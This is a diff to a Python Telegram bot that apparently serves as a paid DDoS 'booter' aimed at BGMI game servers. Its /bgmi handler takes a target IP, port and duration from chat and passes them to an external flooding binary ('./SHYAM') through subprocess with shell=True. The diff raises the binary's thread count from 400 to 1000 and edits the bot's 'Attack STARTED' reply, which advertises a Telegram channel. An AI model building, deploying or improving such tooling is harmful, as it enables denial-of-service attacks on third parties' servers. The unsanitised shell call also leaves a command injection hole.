@@ -208,7 +208,7 @@ def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"{username}, \n✨✨Premium \nAttack1 STARTED 🚀 BY PUSHPA.\n\n📡 𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n🔌 𝐏𝐨𝐫𝐭: {port}\n⏱️ 𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n\n𝐌𝐞𝐭𝐡𝐨𝐝: Premium \nBy https://t.me/ULTRA_GAMER_OP"
+    response = f"{username}, \n✨✨Premium \nAttack STARTED 🚀 BY PUSHPA.\n\n📡 𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n🔌 𝐏𝐨𝐫𝐭: {port}\n⏱️ 𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n\n𝐌𝐞𝐭𝐡𝐨𝐝: Premium \nBy https://t.me/ULTRA_GAMER_OP"
     bot.reply_to(message, response)
 
 # Dictionary to store the last time each user ran the /attack1 command
@@ -245,7 +245,7 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./SHYAM {target} {port} {time} 400"
+                full_command = f"./SHYAM {target} {port} {time} 1000"
                 subprocess.run(full_command, shell=True)
                 response = f"ULTRA 🚀\nAttack1 Finished. \n📡 Target: {target} \n🔌 Port: {port} \n⏱️ Time: {time} \n BY https://t.me/ULTRA_GAMER_OP"
         else:
